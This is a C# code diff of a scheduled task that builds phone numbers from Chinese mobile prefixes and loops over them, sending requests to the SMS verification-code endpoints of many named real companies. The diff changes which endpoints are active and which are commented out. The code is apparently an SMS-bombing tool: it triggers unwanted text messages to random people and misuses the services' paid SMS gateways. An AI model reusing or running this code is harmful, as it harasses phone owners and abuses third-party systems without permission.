@@ -41,48 +41,37 @@ public class RunSendPhoneTasks : IInvocable
     // and mask configuration
     var options = new IdGeneratorOptions(mc, new DefaultTimeSource(epoch));
     var generator = new IdGenerator(generatorId, options);
+    /*
     // 克徕帝
-    // string sendUrl2 = "https://newapplet.crd.cn/Api/Member/Member/SendNewMobileCode?mobile={0}&source=MP-WEIXIN&openid=oTZkE5KTYsIlSTh1gKZ223jeovfI";
+    var sendUrl2 =
+      "https://newapplet.crd.cn/Api/Member/Member/SendNewMobileCode?mobile={0}&source=MP-WEIXIN&openid=oTZkE5KTYsIlSTh1gKZ223jeovfI";
     // lihang 
     var senLingHang = "https://study.mshengedu.com/study/sys/validCode/getCode";
     // 展通安全
     // string sendZtUrl = "https://tnwgh.hnztaqkj.com/Home/SendSmsForResetPwd";
     var sendZtUrl = "https://tnwgh.hnztaqkj.com/wxapis/Home/SendSmsForResetPwd";
-    // 上海 body365
-    // string sendUrl = "https://www.body365.cn/Home/SendSMSCode";
-    // 赫德物流
-    var sendUrlHd = "https://bookinglogin.hart-worldwide.com:9002/driver/loginSms?format=json";
-    // // 快乐车行
-    // string sendKlch = "https://apiv2.klch.cn/api/Member/SendLoginNoCode?phone={0}";
-    // haha 零食
-    var sendHaha = "https://mapi.hahabianli.com/msg/sendPhoneCaptcha";
     // 卓帮医药
-    var zhuobang = "https://api.pianyibang.shop/apiv1/common/sms";
+    // string zhuobang = "https://www.pianyibang.shop/api/sendsms/";
     // 展通1
     var zt =
       "https://edu.hnztaqkj.com/api/api-cms/employee/sendActivateSms?verifyPhone={0}&verifyCode=111&protocolChecked=false";
-    //运连网
-    // string yl = "https://h5.gotofreight.com/api/UserOutside/GetRegistVerifyCode";
-    // string yl1 = "https://m.gotofreight.com/api/services/app/WebLogin/GetPhoneSecurity";
-    //和贵云商
-    var hg = "https://platform.feimawaiqin.com/customer-restapi/customerInfo/unauthorized/sendSms";
-    // 和贵2 
-    // string hg2 = "https://www.hnhegui.com/admin-api/system/user/profile/sendLoginCodeByMobile?mobile={0}&type=ADMIN_MEMBER_LOGIN";
-    //公寓宝
-    // string gyb = "https://rent.kilo-coin.com/renting/app/smscode/wxOwnerLogin/{0}";
-    // 酷乐秀
-    var kl = "https://online.colexiu.com/api-tenant/code/sendSmsCode?mobile={0}&type=1";
-    var kl1 = "https://online.colexiu.com/api-student/code/sendSmsCode";
-    var kl2 = "https://online.colexiu.com/api-teacher/code/sendSmsCode";
-    // 十分熟
-    var sfs = "https://gyl.wmboss.net/gw?store_id=1&2=2&&store_type=1";
-    var sfs1 = "https://mch.wmboss.net/api/anon/sms/code";
-    // 中德安普 aes 加密 在js中
+    // //公寓宝
+    // var gyb = "https://rent.kilo-coin.com/renting/app/smscode/wxOwnerLogin/{0}";
+    // 溪玮云商
+    var xwys = "https://api1.xiweicloud.cn/xiwei2/FrontEnd/UserSmsSend";
+    //师说
+    // string shUrl = "https://api.52cxy.cn/1/passport/captcha.json";
+    // string shUrl1 = "https://api.shishuo.com/passport/captcha.json";
+    var ssUrl = "https://www.oinone.top/pamirs/base";
+    // // 企名片
+    // var qmpUrl = "https://businessapi.qimingpian.cn/Login/sendVerifyCode";
+    */
+    //擎识科技
+    string qs = "https://api.chinnshi.com/basis/verify/get?phone={0}&type=1";
     //随机的手机号码
     var phoneList = new[]
     {
-      "130", "131", "132", "133", "134", "135", "136", "137", "138", "139", "151", "152", "153", "153", "154",
-      "155",
+      "130", "131", "132", "133", "134", "135", "136", "137", "138", "139", "151", "152", "153", "153", "154", "155",
       "156", "157", "158", "159", "181", "182", "183", "184", "185", "186", "187", "188", "189"
     };
     for (var i = 0; i < phoneList.Length; i++)
@@ -94,32 +83,31 @@ public class RunSendPhoneTasks : IInvocable
         var data = phoneList[i] + phone[j];
         using (var http = new HttpClient())
         {
-          // string urlFormat = string.Format(sendUrl2, data);
-          // //短信发送1
-          // HttpResponseMessage response1 = await http.GetAsync(new Uri(urlFormat));
-          // if (response1.IsSuccessStatusCode)
-          // {
-          //   string t = await response1.Content.ReadAsStringAsync();
-          //   _logger.LogInformation($"克徕帝:{t}");
-          // }
-
-          // HttpResponseMessage response2 = await http.GetAsync(new Uri(string.Format(gyb,data)));
-          // if (response2.IsSuccessStatusCode)
-          // {
-          //   string t = await response2.Content.ReadAsStringAsync();
-          //   _logger.LogInformation($"公寓宝：{t}");
-          // }
-          var klhttpContent = new StringContent(
-            JsonConvert.SerializeObject(new { }),
-            Encoding.UTF8, "application/json");
-          //短信发送1
-          var response1 = await http.PostAsync(new Uri(string.Format(kl, data)), klhttpContent);
-          if (response1.IsSuccessStatusCode)
+          var response2 = await http.GetAsync(new Uri(string.Format(qs, data)));
+          if (response2.IsSuccessStatusCode)
           {
-            var t = await response1.Content.ReadAsStringAsync();
-            _logger.LogInformation($"酷乐秀:{t}");
+            var t = await response2.Content.ReadAsStringAsync();
+            _logger.LogInformation($"擎识科技：{t}");
+          }
+          //暂时全部注释
+          /*
+          var urlFormat = string.Format(sendUrl2, data);
+          //短信发送1
+          var kldRes = await http.GetAsync(new Uri(urlFormat));
+          if (kldRes.IsSuccessStatusCode)
+          {
+            var t = await kldRes.Content.ReadAsStringAsync();
+            _logger.LogInformation($"克徕帝:{t}");
           }
 
+          // var response2 = await http.GetAsync(new Uri(string.Format(gyb, data)));
+          // if (response2.IsSuccessStatusCode)
+          // {
+          //   var t = await response2.Content.ReadAsStringAsync();
+          //   _logger.LogInformation($"公寓宝：{t}");
+          // }
+          
+        
           var httpContent1 = new StringContent(
             JsonConvert.SerializeObject(new { phone = data, validType = "DL" }),
             Encoding.UTF8, "application/json");
@@ -131,15 +119,7 @@ public class RunSendPhoneTasks : IInvocable
               _logger.LogInformation($"领航未来教育: {t}");
           }
 
-          var httpContent2 = new StringContent(
-            JsonConvert.SerializeObject(new { phone = data }),
-            Encoding.UTF8, "application/json");
-          var response4 = await http.PostAsync(new Uri(sendHaha), httpContent1);
-          if (response4.IsSuccessStatusCode)
-          {
-            var t = await response4.Content.ReadAsStringAsync();
-            _logger.LogInformation($"哈哈零食: {t}");
-          }
+
 
           var ztHttpContent = new FormUrlEncodedContent(new Dictionary<string, string>
           {
@@ -153,40 +133,35 @@ public class RunSendPhoneTasks : IInvocable
             if (!t.Contains("400")) _logger.LogInformation($"展通安全成功{t}");
           }
 
-          // FormUrlEncodedContent httpContent3 = new FormUrlEncodedContent(new Dictionary<string, string>()
+
+          // var qmpHttpContent = new FormUrlEncodedContent(new Dictionary<string, string>
           // {
-          //   ["val1"] = data,
-          //   ["val3"] = "register"
+          //   ["mobile"] = $"86{data}",
+          //   ["token"] = "",
+          //   ["item_uuid"] = ""
           // });
-          // HttpResponseMessage response5 = await http.PostAsync(new Uri(sendUrl), httpContent3);
-          // if (response5.IsSuccessStatusCode)
+          // var qmpResponse = await http.PostAsync(new Uri(qmpUrl), qmpHttpContent);
+          // if (qmpResponse.IsSuccessStatusCode)
           // {
-          //   string t = await response5.Content.ReadAsStringAsync();
-          //   _logger.LogInformation($"body365: {t}");
+          //   var t = await qmpResponse.Content.ReadAsStringAsync();
+          //
+          //   _logger.LogInformation($"企名片{t}");
           // }
+        
+          
 
-          var httpContent4 = new StringContent(
-            JsonConvert.SerializeObject(new { PhoneNumber = data }),
-            Encoding.UTF8, "application/json");
-          var response6 = await http.PostAsync(new Uri(sendUrlHd), httpContent4);
-          if (response6.IsSuccessStatusCode)
-          {
-            var t = await response6.Content.ReadAsStringAsync();
-            if (!t.Contains("905")) _logger.LogInformation($"赫德物流: {t}");
-          }
-
-          var httpContent5 = new FormUrlEncodedContent(new Dictionary<string, string>
-          {
-            ["mobile"] = data,
-            ["merchid"] = "a5463a3c-8611-45b1-b6c9-57a22fe3c2a2"
-          });
-          var response7 = await http.PostAsync(new Uri(zhuobang), httpContent5);
-          if (response7.IsSuccessStatusCode)
-          {
-            var t = await response7.Content.ReadAsStringAsync();
-
-            _logger.LogInformation($"卓帮医药: {t}");
-          }
+          // FormUrlEncodedContent httpContent5 = new FormUrlEncodedContent(new Dictionary<string, string>()
+          // {
+          //   ["mobile"] = data,
+          //   // ["merchid"] = "a5463a3c-8611-45b1-b6c9-57a22fe3c2a2"
+          // });
+          // HttpResponseMessage response7 = await http.PostAsync(new Uri(zhuobang), httpContent5);
+          // if (response7.IsSuccessStatusCode)
+          // {
+          //   string t = await response7.Content.ReadAsStringAsync();
+          //   
+          //   _logger.LogInformation($"卓帮医药: {t}");
+          // }
 
           var url = string.Format(zt, data);
           var response8 = await http.GetAsync(new Uri(url));
@@ -195,99 +170,58 @@ public class RunSendPhoneTasks : IInvocable
             var t = await response8.Content.ReadAsStringAsync();
             if (!t.Contains("500")) _logger.LogInformation($"展通安全1：{t}");
           }
+          
 
-          // StringContent httpContent5 = new StringContent(
-          //   JsonConvert.SerializeObject(new { Phone = data }),
-          //   Encoding.UTF8, "application/json");
-          // HttpResponseMessage response9 = await http.PostAsync(new Uri(yl), httpContent5);
-          // if (response6.IsSuccessStatusCode)
-          // {
-          //   string t = await response9.Content.ReadAsStringAsync();
-          //  
-          //   _logger.LogInformation($"运连物流: {t}");
-          // }
-
-          // StringContent httpContent6 = new StringContent(
-          //   JsonConvert.SerializeObject(new { PhoneNumber = data,Status=1 }),
-          //   Encoding.UTF8, "application/json");
-          // HttpResponseMessage response10 = await http.PostAsync(new Uri(yl1), httpContent6);
-          // if (response6.IsSuccessStatusCode)
-          // {
-          //   string t = await response10.Content.ReadAsStringAsync();
-          //  
-          //   _logger.LogInformation($"运连物流10: {t}");
-          // }
-
-          var httpContent7 = new StringContent(
-            JsonConvert.SerializeObject(new { mobile = data, smsType = "MEMBER_HG_LOGIN" }),
+          var xwhttpContent = new StringContent(
+            JsonConvert.SerializeObject(new { mobile = data, type = "1" }),
             Encoding.UTF8, "application/json");
-          var response11 = await http.PostAsync(new Uri(hg), httpContent7);
-          if (response11.IsSuccessStatusCode)
+          var response17 = await http.PostAsync(new Uri(xwys), xwhttpContent);
+          if (response17.IsSuccessStatusCode)
           {
-            var t = await response11.Content.ReadAsStringAsync();
-
-            _logger.LogInformation($"和贵云商: {t}");
+            var t = await response17.Content.ReadAsStringAsync();
+            _logger.LogInformation($"溪玮云商: {t}");
           }
 
-          // string urlFormat1 = string.Format(hg2, data);
-          // //短信发送1
-          // HttpResponseMessage response12 = await http.GetAsync(new Uri(urlFormat1));
-          // if (response12.IsSuccessStatusCode)
+          // //师说
+          // var shContent = new FormUrlEncodedContent(new Dictionary<string, string>
           // {
-          //   string t = await response12.Content.ReadAsStringAsync();
-          //   _logger.LogInformation($"和贵云商1: {t}");
+          //   ["code"] = "+86",
+          //   ["mobile"] = data
+          // });
+          // HttpResponseMessage shResponse = await http.PostAsync(new Uri(shUrl), shContent);
+          // if (shResponse.IsSuccessStatusCode)
+          // {
+          //   string t = await shResponse.Content.ReadAsStringAsync();
+          //   
+          //   _logger.LogInformation($"师说{t}");
+          // }
+          // HttpResponseMessage shResponse1 = await http.PostAsync(new Uri(shUrl1), shContent);
+          // if (shResponse1.IsSuccessStatusCode)
+          // {
+          //   string t = await shResponse1.Content.ReadAsStringAsync();
+          //   
+          //   _logger.LogInformation($"师说1{t}");
           // }
 
-
-          var httpContent8 = new StringContent(
-            JsonConvert.SerializeObject(new { phone = data, smsType = "register" }),
+          var query =
+            "\n    mutation{\n      welcomeUserModuleMutation {\n        registerVerificationCode(user:{\n          phone:" +
+            $"\"{data}\"" + ",\n        }) {\n          nickname\n          isBind\n        }\n      }\n    }\n  ";
+          var obj = new
+          {
+            operationName = string.Empty,
+            query,
+            variables = new { }
+          };
+          var sshttpContent = new StringContent(
+            JsonConvert.SerializeObject(obj),
             Encoding.UTF8, "application/json");
-          var response13 = await http.PostAsync(new Uri(sfs1), httpContent8);
-          if (response6.IsSuccessStatusCode)
+          //短信发送1
+          var ssRes = await http.PostAsync(new Uri(ssUrl), sshttpContent);
+          if (ssRes.IsSuccessStatusCode)
           {
-            var t = await response13.Content.ReadAsStringAsync();
-
-            _logger.LogInformation($"十分熟: {t}");
-          }
-
-          var sfsHttpContent = new FormUrlEncodedContent(new Dictionary<string, string>
-          {
-            ["language"] = "zh",
-            ["module"] = "app",
-            ["action"] = "user",
-            ["app"] = "secret_key",
-            ["phone"] = data,
-            ["message_type"] = "0",
-            ["message_type1"] = "1"
-          });
-          var response14 = await http.PostAsync(new Uri(sfs), sfsHttpContent);
-          if (response14.IsSuccessStatusCode)
-          {
-            var t = await response14.Content.ReadAsStringAsync();
-
-            _logger.LogInformation($"十分熟1: {t}");
-          }
-
-          var klHttpContent = new FormUrlEncodedContent(new Dictionary<string, string>
-          {
-            ["mobile"] = data,
-            ["type"] = "LOGIN"
-          });
-          var response15 = await http.PostAsync(new Uri(kl1), klHttpContent);
-          if (response6.IsSuccessStatusCode)
-          {
-            var t = await response15.Content.ReadAsStringAsync();
-
-            _logger.LogInformation($"酷乐秀1: {t}");
-          }
-
-          var response16 = await http.PostAsync(new Uri(kl2), klHttpContent);
-          if (response6.IsSuccessStatusCode)
-          {
-            var t = await response16.Content.ReadAsStringAsync();
-
-            _logger.LogInformation($"酷乐秀2: {t}");
-          }
+            var t = await ssRes.Content.ReadAsStringAsync();
+            _logger.LogInformation($"数式:{t}");
+          }*/
         }
       }
     }
